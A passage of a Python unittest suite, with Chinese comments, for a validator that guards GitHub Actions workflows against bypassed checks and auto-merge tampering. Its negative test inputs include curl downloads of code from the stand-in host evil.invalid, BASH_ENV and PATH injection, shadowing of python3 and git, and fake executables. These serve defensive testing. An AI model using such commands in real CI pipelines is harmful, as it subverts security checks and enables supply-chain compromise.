        problems = self.problems(pr_verify=pr_verify)
        self.assertTrue(any("没有被实际执行" in p for p in problems), problems)

    def test_heredoc_hidden_command_rejected(self):
        pr_verify = swap(PR_VERIFY, BASELINE_CMD,
                         "cat <<'EOF' > /tmp/x\n          " + BASELINE_CMD_BODY + "\n          EOF")
        problems = self.problems(pr_verify=pr_verify)
        self.assertTrue(any("没有被实际执行" in p for p in problems), problems)

    def test_fake_step_name_without_execution_rejected(self):
        """伪造步骤名称但实际不执行命令（§4.4.7）。"""
        pr_verify = replace_step(PR_VERIFY, "policy",
                                 "      - name: 🔐 workflow 策略 guard（结构化）\n        run: echo ok\n")
        problems = self.problems(pr_verify=pr_verify)
        self.assertTrue(any("缺少必需命令" in p for p in problems), problems)

    def test_unittest_replaced_by_noop_with_step_name_kept_rejected(self):
        pr_verify = swap(PR_VERIFY, UNITTEST_CMD,
                         "run: " + yaml_scalar('echo "$PY_BIN -m unittest discover '
                                               '-s scripts/tests"', True))
        problems = self.problems(pr_verify=pr_verify)
        self.assertTrue(any("全量单元测试" in p for p in problems), problems)

    def test_missing_configs_command_rejected(self):
        pr_verify = swap(PR_VERIFY, CONFIGS_CMD, "run: echo skipped")
        self.assertTrue(any("verify_configs.py" in p for p in self.problems(pr_verify=pr_verify)))

    def test_readme_check_flag_removed_rejected(self):
        pr_verify = swap(PR_VERIFY, README_CMD,
                         "run: " + yaml_scalar('"$PY_BIN" scripts/readme_stats.py', True))
        problems = self.problems(pr_verify=pr_verify)
        self.assertTrue(any("README 统计口径" in p for p in problems), problems)

    def test_dependency_install_noop_rejected(self):
        pr_verify = swap(PR_VERIFY, PIP_CMD,
                         "run: " + yaml_scalar('echo "$PY_BIN -m pip install pyyaml"', True))
        self.assertTrue(any("安装依赖 pyyaml" in p for p in self.problems(pr_verify=pr_verify)))

    def test_sha_validation_noop_rejected(self):
        pr_verify = swap(PR_VERIFY, "run: printf '%s' \"a\" | grep -Eq '^[0-9a-f]{40}$'",
                         'run: echo "grep -Eq ^[0-9a-f]{40}$"')
        self.assertTrue(any("SHA 格式" in p for p in self.problems(pr_verify=pr_verify)))

    def test_base_availability_check_removed_rejected(self):
        pr_verify = swap(PR_VERIFY, CATFILE_CMD, "true")
        problems = self.problems(pr_verify=pr_verify)
        self.assertTrue(any("提交可用" in p for p in problems), problems)

    def test_base_check_moved_after_baseline_rejected(self):
        """把 base 可用性检查放到基线 guard **之后**必须失败（步骤级顺序合同）。"""
        line = '          "$GIT_BIN" cat-file -e "${PR_BASE_SHA}^{commit}"\n'
        assert line in PR_VERIFY, "fixture 未命中：base 可用性检查行"
        pr_verify = PR_VERIFY.replace(line, "")
        late = ("      - name: late-base-check\n"
                "        run: '\"$GIT_BIN\" cat-file -e \"${PR_BASE_SHA}^{commit}\"'\n")
        pr_verify = pr_verify.rstrip("\n") + "\n" + late
        assert late in pr_verify, "fixture 未命中：晚置步骤未插入"
        problems = self.problems(pr_verify=pr_verify)
        self.assertTrue(any("必须位于" in p for p in problems), problems)

    def test_real_layout_satisfies_contract_for_all_three_jobs(self):
        self.assertEqual(self.problems(), [])


# --------------------------------------------------------------------------- P14
class CheckNameUniquenessTest(Fixture):
    """Fix A.2：必需检查名只允许出现在 pr-verify.yml 的预期 job 中。"""

    OTHER_JOB_SAME_ID = """name: other verification
on:
  pull_request:
permissions:
  contents: read
jobs:
  general-pr-verify:
    name: general-pr-verify
    runs-on: ubuntu-latest
    steps:
      - run: echo ok
"""

    OTHER_JOB_SAME_NAME = """name: other verification
on:
  pull_request:
permissions:
  contents: read
jobs:
  helper:
    name: general-pr-verify
    runs-on: ubuntu-latest
    steps:
      - run: echo ok
"""

    OTHER_JOB_BENIGN = """name: other verification
on:
  pull_request:
permissions:
  contents: read
jobs:
  lint:
    name: lint
    runs-on: ubuntu-latest
    steps:
      - run: echo ok
"""

    def test_other_workflow_declaring_required_job_id_rejected(self):
        problems = self.problems(extra={"other-verify.yml": self.OTHER_JOB_SAME_ID})
        self.assertTrue(any("声明了必需检查名" in p for p in problems), problems)

    def test_other_workflow_declaring_required_job_name_rejected(self):
        problems = self.problems(extra={"other-verify.yml": self.OTHER_JOB_SAME_NAME})
        self.assertTrue(any("声明了必需检查名" in p for p in problems), problems)

    def test_other_workflow_without_required_names_passes(self):
        self.assertEqual(self.problems(extra={"other-verify.yml": self.OTHER_JOB_BENIGN}), [])

    def test_all_three_names_are_protected(self):
        for name in ("general-pr-verify", "workflow-policy-guard", "trusted-baseline-guard"):
            with self.subTest(name=name):
                text = (f"name: x\non:\n  pull_request:\npermissions:\n  contents: read\n"
                        f"jobs:\n  {name}:\n    name: {name}\n"
                        f"    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n")
                problems = self.problems(extra={"other-verify.yml": text})
                self.assertTrue(any("声明了必需检查名" in p for p in problems), problems)


class AutoMergePermissionsWithActionsReadTest(Fixture):
    def test_automerge_requires_actions_read_and_rejects_actions_write(self):
        good = self.problems()
        self.assertEqual(good, [])
        with_write = swap(CANDIDATE, "      actions: read", "      actions: write")
        problems = self.problems(candidate=with_write)
        self.assertTrue(any("permissions 必须恰为" in p for p in problems), problems)

    def test_missing_actions_read_rejected(self):
        without = swap(CANDIDATE, "      actions: read\n", "")
        problems = self.problems(candidate=without)
        self.assertTrue(any("permissions 必须恰为" in p for p in problems), problems)


# --------------------------------------------------------------------------- Fix A（第四轮）
def block(prefix: str, body_lines: list[str]) -> str:
    """把单行命令改写成多行 shell 块（保持 YAML 合法）。"""
    if "run:" in prefix:                     # 普通标量：必须显式块标量
        head, ind = prefix.rstrip() + " |", " " * (len(prefix) + 2)
    else:                                    # 已在块标量内
        head, ind = None, prefix
    return "\n".join(([head] if head else []) + [ind + ln for ln in body_lines])


class CommandExecutionProofTest(Fixture):
    """Fix A：`-m py_compile`、`-c`、跨行控制流、未调用函数等都不算「执行」。"""

    def expect_rejected(self, pr_verify: str, label: str):
        problems = self.problems(pr_verify=pr_verify)
        self.assertTrue(any("没有被实际执行" in p or "缺少必需命令" in p for p in problems),
                        f"{label}: {problems}")
        return problems

    def each(self):
        """(job, 命令行前缀, 未加 YAML 引号的命令文本)。"""
        return [(job, JOB_PREFIX[job], JOB_INNER[job]) for job in JOB_ORDER]

    def test_py_compile_substitution_rejected_for_every_job(self):
        for job, prefix, body in self.each():
            with self.subTest(job=job):
                repl = job_cmd(job, JOBS_INTERP[job] + " -m py_compile " + JOBS_TARGET[job])
                self.expect_rejected(swap(PR_VERIFY, job_cmd(job, body), repl), job)

    def test_inline_c_substitution_rejected_for_every_job(self):
        for job, prefix, body in self.each():
            with self.subTest(job=job):
                repl = job_cmd(job, JOBS_INTERP[job] + " -c print(1) " + JOBS_TARGET[job])
                self.expect_rejected(swap(PR_VERIFY, job_cmd(job, body), repl), job)

    def test_cross_line_if_false_rejected_for_every_job(self):
        for job, prefix, body in self.each():
            with self.subTest(job=job):
                repl = block(prefix, ["if false; then", "  " + body, "fi"])
                self.expect_rejected(swap(PR_VERIFY, job_cmd(job, body), repl), job)

    def test_uncalled_shell_function_rejected_for_every_job(self):
        for job, prefix, body in self.each():
            with self.subTest(job=job):
                repl = block(prefix, ["run_guard() {", "  " + body, "}"])
                self.expect_rejected(swap(PR_VERIFY, job_cmd(job, body), repl), job)

    def test_case_branch_rejected(self):
        for job, prefix, body in self.each():
            with self.subTest(job=job):
                repl = block(prefix, ["case \"$X\" in", "  a) " + body + " ;;", "esac"])
                self.expect_rejected(swap(PR_VERIFY, job_cmd(job, body), repl), job)

    def test_for_loop_rejected(self):
        for job, prefix, body in self.each():
            with self.subTest(job=job):
                repl = block(prefix, ["for i in 1; do", "  " + body, "done"])
                self.expect_rejected(swap(PR_VERIFY, job_cmd(job, body), repl), job)

    def test_while_loop_rejected(self):
        for job, prefix, body in self.each():
            with self.subTest(job=job):
                repl = block(prefix, ["while false; do", "  " + body, "done"])
                self.expect_rejected(swap(PR_VERIFY, job_cmd(job, body), repl), job)

    def test_subshell_rejected(self):
        for job, prefix, body in self.each():
            with self.subTest(job=job):
                repl = block(prefix, ["(", "  " + body, ")"])
                self.expect_rejected(swap(PR_VERIFY, job_cmd(job, body), repl), job)

    def test_brace_group_rejected(self):
        for job, prefix, body in self.each():
            with self.subTest(job=job):
                repl = block(prefix, ["{", "  " + body, "}"])
                self.expect_rejected(swap(PR_VERIFY, job_cmd(job, body), repl), job)

    def test_single_line_brace_group_rejected(self):
        job = "trusted-baseline-guard"                # baseline job（块标量内，无需引号）
        prefix, body = JOB_PREFIX[job], JOB_INNER[job]
        repl = prefix + "{ " + body + "; }"
        self.expect_rejected(swap(PR_VERIFY, job_cmd(job, body), repl), job)

    def test_real_layout_still_passes(self):
        self.assertEqual(self.problems(), [])


def replace_run(step: str, new_lines: list[str]) -> str:
    """把 step 的 `run: <cmd>` 换成块标量（避免 YAML 标量转义问题）。"""
    head, sep, tail = step.partition("        run: ")
    assert sep, step
    assert tail.endswith("\n")
    indent = " " * 10
    return head + "        run: |\n" + "".join(indent + ln + "\n" for ln in new_lines)


class AutoMergeCommandContractTest(Fixture):
    """Fix B：auto-merge 三个前置命令必须真正执行、顺序正确、独立步骤、带 env。"""

    def test_each_helper_replaced_by_echo_rejected(self):
        for label, step in (("await_checks.py", AWAIT_STEP), ("verify_required_checks.py", VERIFY_STEP),
                            ("request_automerge.py", AUTOMERGE_STEP)):
            with self.subTest(helper=label):
                body = ("echo \"NOT EXECUTED: " + label + "\" "
                        + step.split("        run: python3 scripts/ci/" + label + " ", 1)[1].strip())
                repl = replace_run(step, [body])
                problems = self.problems(candidate=CANDIDATE.replace(step, repl))
                self.assertTrue(any("没有被实际执行" in p or "缺少必需命令" in p for p in problems), problems)

    def test_helper_in_comment_rejected(self):
        repl = replace_run(AUTOMERGE_STEP,
                           ["# python3 scripts/ci/request_automerge.py --repo o/r --pr 1 --head-sha s"])
        problems = self.problems(candidate=CANDIDATE.replace(AUTOMERGE_STEP, repl))
        self.assertTrue(any("没有被实际执行" in p or "缺少必需命令" in p for p in problems), problems)

    def test_helper_moved_into_if_false_rejected(self):
        body = "python3 scripts/ci/request_automerge.py " + _AM_ARGS
        repl = replace_run(AUTOMERGE_STEP, ["if false; then", "  " + body, "fi"])
        problems = self.problems(candidate=CANDIDATE.replace(AUTOMERGE_STEP, repl))
        self.assertTrue(any("没有被实际执行" in p for p in problems), problems)

    def test_helper_via_uncalled_function_rejected(self):
        body = "python3 scripts/ci/request_automerge.py " + _AM_ARGS
        repl = replace_run(AUTOMERGE_STEP, ["am() {", "  " + body, "}"])
        problems = self.problems(candidate=CANDIDATE.replace(AUTOMERGE_STEP, repl))
        self.assertTrue(any("没有被实际执行" in p for p in problems), problems)

    def test_missing_expected_head_sha_arg_rejected(self):
        repl = AWAIT_STEP.replace(' --expected-head-sha "${{ needs.publish.outputs.head_sha }}"', "")
        problems = self.problems(candidate=CANDIDATE.replace(AWAIT_STEP, repl))
        self.assertTrue(any("--expected-head-sha" in p for p in problems), problems)

    def test_missing_env_rejected(self):
        repl = VERIFY_STEP.replace("        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n", "")
        problems = self.problems(candidate=CANDIDATE.replace(VERIFY_STEP, repl))
        self.assertTrue(any("必须声明 env GITHUB_TOKEN" in p for p in problems), problems)

    def test_helpers_collapsed_into_one_step_rejected(self):
        merged = ("      - name: merged\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n"
                  "        run: |\n"
                  "          python3 scripts/ci/await_checks.py " + _AWAIT_ARGS + "\n"
                  "          python3 scripts/ci/verify_required_checks.py " + _VERIFY_ARGS + "\n"
                  "          python3 scripts/ci/request_automerge.py " + _AM_ARGS + "\n")
        problems = self.problems(candidate=CANDIDATE.replace(AWAIT_STEP + VERIFY_STEP + AUTOMERGE_STEP, merged))
        self.assertTrue(any("独立步骤" in p for p in problems), problems)

    def test_real_candidate_satisfies_automerge_contract(self):
        self.assertEqual(self.problems(), [])


class DirectAutoMergeMutationTest(Fixture):
    """Fix B3：workflow 内禁止直接发送 auto-merge / 合并 mutation（必须走 helper）。"""

    def inject(self, command: str) -> str:
        return CANDIDATE.replace(
            AUTOMERGE_STEP,
            replace_run(AUTOMERGE_STEP,
                        [command, "python3 scripts/ci/request_automerge.py " + _AM_ARGS]))

    def assert_rejected(self, command: str, needle: str):
        problems = self.problems(candidate=self.inject(command))
        self.assertTrue(any(needle in p for p in problems), f"{command!r} -> {problems}")

    def test_gh_api_graphql_enable_auto_merge_rejected(self):
        self.assert_rejected(
            'gh api graphql -f query=\'mutation{enablePullRequestAutoMerge(input:{pullRequestId:"x",'
            'mergeMethod:MERGE})}\'', "直接 auto-merge mutation 标记")

    def test_gh_api_graphql_generic_rejected(self):
        self.assert_rejected("gh api graphql -f query='query{viewer{login}}'", "gh api graphql")

    def test_rest_merge_endpoint_rejected(self):
        self.assert_rejected('curl -sS -X PUT -H "Authorization: Bearer $TOKEN" '
                             '"https://api.github.com/repos/o/r/pulls/1/merge"', "REST merge 端点")

    def test_gh_pr_merge_rejected(self):
        self.assert_rejected("gh pr merge 1 --squash", "gh pr merge")

    def test_curl_graphql_rejected(self):
        self.assert_rejected('curl -sS https://api.github.com/graphql -d @payload.json', "HTTP 客户端直接发 GraphQL")

    def test_shell_wrapper_bypass_rejected(self):
        self.assert_rejected('bash -c "gh api graphql -f query=\'mutation{enablePullRequestAutoMerge}\'"',
                             "直接 auto-merge mutation 标记")

    def test_interpreter_inline_wrapper_rejected(self):
        self.assert_rejected('python3 -c "import json;print(\'enablePullRequestAutoMerge\')"',
                             "直接 auto-merge mutation 标记")

    def test_direct_mutation_in_pr_verify_rejected(self):
        """任何 workflow 都不得直接 mutation（含 pr-verify.yml）。"""
        pr_verify = swap(PR_VERIFY, job_cmd("general-pr-verify", JOB_INNER["general-pr-verify"]),
                         block("        run: ", ["gh api graphql -f query='mutation{"
                                            "enablePullRequestAutoMerge}'"]))
        problems = self.problems(pr_verify=pr_verify)
        self.assertTrue(any("直接 auto-merge mutation 标记" in p for p in problems), problems)

    def test_real_candidate_has_no_direct_mutation(self):
        self.assertEqual(self.problems(), [])

    def test_readonly_auto_merge_field_is_not_a_violation(self):
        """读取 PR 对象的 auto_merge 字段不是 mutation（避免误伤只读回读）。"""
        candidate = CANDIDATE.replace(
            AUTOMERGE_STEP,
            replace_run(AUTOMERGE_STEP, [
                "python3 scripts/ci/request_automerge.py " + _AM_ARGS,
                'curl -sS "https://api.github.com/repos/o/r/pulls/1" | python3 -c '
                '\'import json,sys;d=json.load(sys.stdin);print(d.get("auto_merge"))\'']))
        self.assertEqual(self.problems(candidate=candidate), [])


# --------------------------------------------------------------------------- 第五轮 Fix A
MASQUERADE = "attacker-controlled"


class PathIdentityTest(Fixture):
    """Fix A：脚本路径必须**精确匹配**，同名换目录/绝对路径/伪装副本一律拒绝。"""

    REQUIRED = [
        ("general-pr-verify", "scripts/ci/verify_general_pr.py"),
        ("general-pr-verify", "scripts/verify_configs.py"),
        ("general-pr-verify", "scripts/verify_rulesets.py"),
        ("general-pr-verify", "scripts/icon_urls.py"),
        ("general-pr-verify", "scripts/readme_stats.py"),
        ("workflow-policy-guard", "scripts/ci/verify_workflow_policy.py"),
        ("trusted-baseline-guard", "$RUNNER_TEMP/verify_policy_baseline.py"),
    ]

    def test_masquerade_path_rejected_for_every_required_command(self):
        for job, path in self.REQUIRED:
            with self.subTest(job=job, path=path):
                name = path.rsplit("/", 1)[-1]
                problems = self.problems(pr_verify=swap(PR_VERIFY, path, MASQUERADE + "/" + name),
                                         extra_files={MASQUERADE + "/" + name: "# attacker\n"})
                self.assertTrue(any("路径身份不符" in p or "没有被实际执行" in p for p in problems),
                                f"{job}/{path}: {problems}")

    def test_absolute_path_rejected(self):
        for job, path in self.REQUIRED:
            with self.subTest(job=job, path=path):
                name = path.rsplit("/", 1)[-1]
                problems = self.problems(pr_verify=swap(PR_VERIFY, path, "/tmp/" + name))
                self.assertTrue(any("路径身份不符" in p or "没有被实际执行" in p for p in problems),
                                f"{job}/{path}: {problems}")

    def test_parent_dir_traversal_rejected(self):
        problems = self.problems(pr_verify=swap(PR_VERIFY, "scripts/ci/verify_general_pr.py",
                                                "scripts/ci/../ci/verify_general_pr.py"))
        self.assertTrue(any("路径身份不符" in p or "没有被实际执行" in p for p in problems), problems)

    def test_temp_copy_of_baseline_guard_in_other_dir_rejected(self):
        problems = self.problems(pr_verify=swap(PR_VERIFY, "$RUNNER_TEMP/verify_policy_baseline.py",
                                                "$TMPDIR/verify_policy_baseline.py"))
        self.assertTrue(any("路径身份不符" in p or "没有被实际执行" in p for p in problems), problems)

    def test_dot_slash_prefix_still_accepted(self):
        """`./scripts/...` 与 `scripts/...` 等价（同一文件），不得误杀。"""
        problems = self.problems(pr_verify=swap(PR_VERIFY, "'\"$PY_BIN\" scripts/ci/verify_general_pr.py'",
                                                "'\"$PY_BIN\" ./scripts/ci/verify_general_pr.py'"))
        self.assertEqual(problems, [])

    def test_real_layout_passes(self):
        self.assertEqual(self.problems(), [])


class AutoMergePathIdentityTest(Fixture):
    """Fix A：auto-merge 三个 helper 的路径必须精确匹配。"""

    HELPERS = [("await_checks.py", "scripts/ci/await_checks.py"),
               ("verify_required_checks.py", "scripts/ci/verify_required_checks.py"),
               ("request_automerge.py", "scripts/ci/request_automerge.py")]

    def test_masquerade_helper_rejected(self):
        for label, path in self.HELPERS:
            with self.subTest(helper=label):
                candidate = CANDIDATE.replace("python3 " + path,
                                              "python3 " + MASQUERADE + "/" + label)
                problems = self.problems(candidate=candidate,
                                         extra_files={MASQUERADE + "/" + label: "# attacker\n"})
                self.assertTrue(any("路径身份不符" in p or "没有被实际执行" in p for p in problems),
                                f"{label}: {problems}")

    def test_absolute_helper_path_rejected(self):
        for label, path in self.HELPERS:
            with self.subTest(helper=label):
                problems = self.problems(candidate=CANDIDATE.replace("python3 " + path,
                                                                     "python3 /tmp/" + label))
                self.assertTrue(any("路径身份不符" in p or "没有被实际执行" in p for p in problems),
                                f"{label}: {problems}")

    def test_real_candidate_passes(self):
        self.assertEqual(self.problems(), [])


# --------------------------------------------------------------------------- 第五轮 Fix B
class ArgvShortCircuitTest(Fixture):
    """Fix B：参数合同必须是**解析后的结构**；`--help` 等短路、未知/重复/缺值一律拒绝。"""

    def expect_rejected(self, pr_verify=None, candidate=None, needle="参数合同"):
        kw = {}
        if pr_verify is not None:
            kw["pr_verify"] = pr_verify
        if candidate is not None:
            kw["candidate"] = candidate
        problems = self.problems(**kw)
        self.assertTrue(any(needle in p for p in problems), problems)
        return problems

    def test_policy_guard_help_rejected(self):
        for extra in (" --help", " -h", " --usage", " --version"):
            with self.subTest(extra=extra):
                self.expect_rejected(pr_verify=swap(PR_VERIFY, POLICY_CMD_BODY,
                                                    POLICY_CMD_BODY + extra))

    def test_policy_guard_unknown_duplicate_missing_value_rejected(self):
        cases = {
            "未知参数": POLICY_CMD_BODY + " --skip-checks",
            "重复 flag": POLICY_CMD_BODY + ' --json "$RUNNER_TEMP/workflow-policy.json"',
            "缺值": '"$PY_BIN" scripts/ci/verify_workflow_policy.py --json',
            "错值": '"$PY_BIN" scripts/ci/verify_workflow_policy.py --json "/tmp/x.json"',
            "位置参数": POLICY_CMD_BODY + " extra.json",
        }
        for label, repl in cases.items():
            with self.subTest(case=label):
                self.expect_rejected(pr_verify=swap(PR_VERIFY, POLICY_CMD_BODY, repl))

    def test_baseline_guard_help_and_unknown_rejected(self):
        for extra in (" --help", " -h", " --force", " --repo-root /tmp"):
            with self.subTest(extra=extra):
                self.expect_rejected(pr_verify=swap(PR_VERIFY, BASELINE_CMD_BODY,
                                                    BASELINE_CMD_BODY + extra))

    def test_baseline_guard_missing_required_flag_rejected(self):
        for drop in (' --repo-root .', ' --head-sha "${PR_HEAD_SHA}"',
                     ' --base-sha "${PR_BASE_SHA}"', ' --json "$RUNNER_TEMP/trusted-baseline.json"'):
            with self.subTest(drop=drop):
                self.expect_rejected(pr_verify=swap(PR_VERIFY, BASELINE_CMD_BODY,
                                                    BASELINE_CMD_BODY.replace(drop, "")))

    def test_general_guard_extra_args_rejected(self):
        inner = JOB_INNER["general-pr-verify"]
        for extra in (" --help", " --check", " -v"):
            with self.subTest(extra=extra):
                self.expect_rejected(pr_verify=swap(PR_VERIFY, inner, inner + extra))

    def test_readme_and_unittest_extra_args_rejected(self):
        readme = '"$PY_BIN" scripts/readme_stats.py --check'
        unit = '"$PY_BIN" -m unittest discover -s scripts/tests'
        cases = [("readme 重复", readme, readme + " --check"),
                 ("readme 未知", readme, readme + " --fix"),
                 ("readme 缺 check", readme, readme.replace(" --check", "")),
                 ("unittest 附加", unit, unit + " -v"),
                 ("unittest 换目录", unit, unit + "/other")]
        for label, old, repl in cases:
            with self.subTest(case=label):
                self.expect_rejected(pr_verify=swap(PR_VERIFY, old, repl))

    def test_automerge_helpers_help_and_extra_rejected(self):
        for label, step in (("await", AWAIT_STEP), ("verify", VERIFY_STEP), ("automerge", AUTOMERGE_STEP)):
            with self.subTest(helper=label):
                body = step.split("        run: ", 1)[1].strip()
                for extra in (" --help", " -h", " --dry-run"):
                    repl = replace_run(step, [body + extra])
                    self.expect_rejected(candidate=CANDIDATE.replace(step, repl))

    def test_automerge_helper_extra_help_invocation_rejected(self):
        """额外追加一条只做短路的 `--help` 调用也必须拒绝（不允许安全命令出现未声明调用）。"""
        body = AUTOMERGE_STEP.split("        run: ", 1)[1].strip()
        repl = replace_run(AUTOMERGE_STEP, [body, body + " --help"])
        self.expect_rejected(candidate=CANDIDATE.replace(AUTOMERGE_STEP, repl))

    def test_real_commands_still_pass(self):
        self.assertEqual(self.problems(), [])


class BaselineGuardProvenanceTest(Fixture):
    """Fix A1：可信基线 guard 的来源与复制步骤合同（bootstrap 一次性限制保留）。"""

    COND = 'if "$GIT_BIN" cat-file -e "${PR_BASE_SHA}:scripts/ci/verify_policy_baseline.py" 2>/dev/null; then'
    BASE_COPY = ('            "$GIT_BIN" show "${PR_BASE_SHA}:scripts/ci/verify_policy_baseline.py" '
                 '> "$RUNNER_TEMP/verify_policy_baseline.py"')
    HEAD_COPY = ('            "$GIT_BIN" show "${PR_HEAD_SHA}:scripts/ci/verify_policy_baseline.py" '
                 '> "$RUNNER_TEMP/verify_policy_baseline.py"')

    def test_real_layout_passes(self):
        self.assertEqual(self.problems(), [])

    def test_missing_condition_rejected(self):
        problems = self.problems(pr_verify=swap(PR_VERIFY, "          " + self.COND + "\n", ""))
        self.assertTrue(any("git cat-file -e ${PR_BASE_SHA}" in p for p in problems), problems)

    def test_missing_base_copy_rejected(self):
        problems = self.problems(pr_verify=swap(PR_VERIFY, self.BASE_COPY + "\n", ""))
        self.assertTrue(any("then 分支" in p for p in problems), problems)

    def test_missing_bootstrap_fallback_rejected(self):
        problems = self.problems(pr_verify=swap(PR_VERIFY, self.HEAD_COPY + "\n", ""))
        self.assertTrue(any("else 分支" in p for p in problems), problems)

    def test_attacker_sourced_copy_rejected(self):
        """来源换成攻击者控制的 ref 必须拒绝（不得把任意目录/任意 ref 的同名文件当可信 guard）。"""
        problems = self.problems(pr_verify=swap(
            PR_VERIFY, self.BASE_COPY,
            '            git show "attacker-controlled:scripts/ci/verify_policy_baseline.py" '
            '> "$RUNNER_TEMP/verify_policy_baseline.py"'))
        self.assertTrue(any("then 分支" in p or "未允许的上下文" in p for p in problems), problems)

    def test_cp_into_target_rejected(self):
        problems = self.problems(pr_verify=swap(
            PR_VERIFY, self.COND + "\n",
            self.COND + "\n          cp attacker-controlled/verify_policy_baseline.py "
            '"$RUNNER_TEMP/verify_policy_baseline.py"\n'))
        self.assertTrue(any("未允许的上下文" in p for p in problems), problems)

    def test_curl_into_target_rejected(self):
        problems = self.problems(pr_verify=swap(
            PR_VERIFY, self.COND + "\n",
            self.COND + "\n          curl -sS -o \"$RUNNER_TEMP/verify_policy_baseline.py\" "
            "https://evil.invalid/x.py\n"))
        self.assertTrue(any("未允许的上下文" in p for p in problems), problems)

    def test_copy_outside_branches_rejected(self):
        """把 base 复制挪到 if/else 之外（无条件复制）也必须拒绝。"""
        pr_verify = swap(PR_VERIFY, self.BASE_COPY + "\n", "")
        pr_verify = swap(pr_verify, self.HEAD_COPY + "\n", "")
        pr_verify = swap(pr_verify, "          fi\n", "          fi\n" + self.BASE_COPY + "\n")
        problems = self.problems(pr_verify=pr_verify)
        self.assertTrue(any("then 分支" in p for p in problems), problems)


# --------------------------------------------------------------------------- 第六轮 P16
class ShadowingContractTest(Fixture):
    """P16：命令遮蔽 / 启动环境注入 / PATH 伪装 / 同名伪造可执行文件必须被 fail-closed 拒绝。

    A/B 探针（第六轮证据包 probe_round6.py）显示：这 12 类构造在第五轮实现下**全部漏报**
    （exit 0），且在最坏情况下 guard 步骤 exit=0 却输出 SHADOWED（真实 bash 复现见证据包
    runtime_round6.json）。这里把每一类固化为负向测试。
    """

    def prep_step(self, lines: list[str], name: str = "prep") -> str:
        body = "".join("          " + ln + "\n" for ln in lines)
        return f"      - name: {name}\n        run: |\n{body}"

    def with_prep(self, lines: list[str]) -> str:
        """在 workflow-policy-guard 的首个步骤前插入恶意准备步骤。"""
        anchor = "  workflow-policy-guard:\n"
        at = PR_VERIFY.index(anchor) + len(anchor)
        steps = PR_VERIFY.index("    steps:\n", at) + len("    steps:\n")
        return PR_VERIFY[:steps] + self.prep_step(lines) + PR_VERIFY[steps:]

    def assertShadowRejected(self, pr_verify: str, needle: str) -> list[str]:
        problems = self.problems(pr_verify=pr_verify)
        self.assertTrue(any(needle in p for p in problems), f"未命中 {needle!r}：{problems}")
        return problems

    def test_same_step_function_shadow_rejected(self):
        """P0-C：guard 步骤同一 run block 里定义 python3()。"""
        pr_verify = swap(PR_VERIFY, "          " + POLICY_CMD_BODY,
                         "          python3() { echo SHADOWED; return 0; }\n"
                         "          " + POLICY_CMD_BODY)
        self.assertShadowRejected(pr_verify, "定义了受保护命令")

    def test_same_step_git_function_shadow_rejected(self):
        """P0-D：基线 guard 步骤同一 run block 里定义 git()。"""
        pr_verify = swap(PR_VERIFY, "          " + BASELINE_CMD_BODY,
                         "          git() { return 0; }\n          " + BASELINE_CMD_BODY)
        self.assertShadowRejected(pr_verify, "定义了受保护命令")

    def test_function_in_previous_step_rejected(self):
        self.assertShadowRejected(self.with_prep(["python3() { echo SHADOWED; return 0; }"]),
                                  "定义了受保护命令")

    def test_export_function_rejected(self):
        self.assertShadowRejected(self.with_prep(["python3() { echo SHADOWED; return 0; }",
                                                  "export -f python3"]),
                                  "导出/声明了受保护命令")

    def test_alias_rejected(self):
        self.assertShadowRejected(self.with_prep(["alias python3='echo SHADOWED'"]),
                                  "alias 覆盖了受保护命令")

    def test_bash_env_injection_rejected(self):
        self.assertShadowRejected(
            self.with_prep(["printf 'python3() { echo SHADOWED; return 0; }\\n' > /tmp/shim.sh",
                            'echo "BASH_ENV=/tmp/shim.sh" >> "$GITHUB_ENV"']), "BASH_ENV")

    def test_path_rewrite_rejected(self):
        self.assertShadowRejected(self.with_prep(['echo "PATH=/tmp/shim:${PATH}" >> "$GITHUB_ENV"']),
                                  "PATH")

    def test_fake_executable_write_rejected(self):
        self.assertShadowRejected(
            self.with_prep(['printf "#!/bin/sh\\necho SHADOWED\\n" > /tmp/shim/python3']),
            "写入/创建了与受保护命令同名的文件")

    def test_fake_git_copy_rejected(self):
        self.assertShadowRejected(self.with_prep(["cp /bin/true /tmp/shim/git"]),
                                  "写入/创建了与受保护命令同名的文件")

    def test_fake_executable_download_rejected(self):
        self.assertShadowRejected(
            self.with_prep(["curl -sS -o /tmp/shim/git https://evil.invalid/git"]),
            "写入/创建了与受保护命令同名的文件")

    def test_real_layout_has_no_shadowing(self):
        self.assertEqual([p for p in self.problems()
                          if "遮蔽" in p or "受保护命令" in p or "BASH_ENV" in p], [])


# --------------------------------------------------------------------------- 第六轮 P17
class ExecIdentityContractTest(Fixture):
    """P17：守卫必须由**核验过的绝对路径可执行文件**调用，并核验真实产出的 JSON 报告。"""

    def assertRejected(self, pr_verify: str, needle: str) -> list[str]:
        problems = self.problems(pr_verify=pr_verify)
        self.assertTrue(any(needle in p for p in problems), f"未命中 {needle!r}：{problems}")
        return problems

    def remove_step(self, pr_verify: str, step_name: str) -> str:
        return replace_step(pr_verify, step_name, "")

    def test_bare_interpreter_invocation_rejected(self):
        """P0-C 根因：守卫用裸 `python3` 调用（可被 shell 函数/别名/PATH 劫持）。"""
        pr_verify = swap(PR_VERIFY, POLICY_CMD_BODY,
                         'python3 scripts/ci/verify_workflow_policy.py '
                         '--json "$RUNNER_TEMP/workflow-policy.json"')
        self.assertRejected(pr_verify, "必须由核验过的可执行文件")

    def test_bare_interpreter_general_job_rejected(self):
        pr_verify = swap(PR_VERIFY, JOB_INNER["general-pr-verify"],
                         "python3 scripts/ci/verify_general_pr.py")
        self.assertRejected(pr_verify, "必须由核验过的可执行文件")

    def test_missing_resolver_step_rejected(self):
        self.assertRejected(self.remove_step(PR_VERIFY, "exe"),
                            "缺少「可执行文件身份核验」步骤")

    def test_resolver_after_guard_rejected(self):
        """核验步骤存在但位于守卫调用之后 → 顺序合同失败。"""
        start = PR_VERIFY.index("      - name: exe\n")
        end = PR_VERIFY.index("\n      - ", start + 1) + 1
        block = PR_VERIFY[start:end]
        pr_verify = PR_VERIFY[:start] + PR_VERIFY[end:]
        job_end = pr_verify.index("\n  workflow-policy-guard:")
        pr_verify = pr_verify[:job_end + 1] + block + pr_verify[job_end + 1:]
        self.assertRejected(pr_verify, "必须位于守卫调用之前")

    def test_resolver_var_assignment_outside_resolver_rejected(self):
        """后续步骤不得改写 PY_BIN/GIT_BIN（否则可指向伪造可执行文件）。"""
